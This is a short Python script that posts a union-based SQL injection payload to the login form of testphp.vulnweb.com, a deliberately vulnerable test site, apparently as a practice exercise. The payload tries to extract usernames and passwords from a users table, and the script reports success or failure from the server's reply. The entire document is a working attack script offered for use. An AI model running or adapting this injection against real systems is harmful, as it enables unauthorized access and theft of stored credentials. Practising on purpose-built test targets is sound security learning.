import requests

url = "http://testphp.vulnweb.com/userinfo.php"

payload = {
    "uname": "' UNION SELECT null, null, username, password FROM users -- ",
    "pass": "Anything_You_Can_Write_as_Passowrd"
}

response = requests.post(url, data=payload)

if response.status_code == 200 and ("Welcome" in response.text or "dashboard" in response.text):
    print(f"[+] Union-based SQL Injection Successful with payload:")
else:
    print("[-] Injection Failed! Server response did not indicate success.")
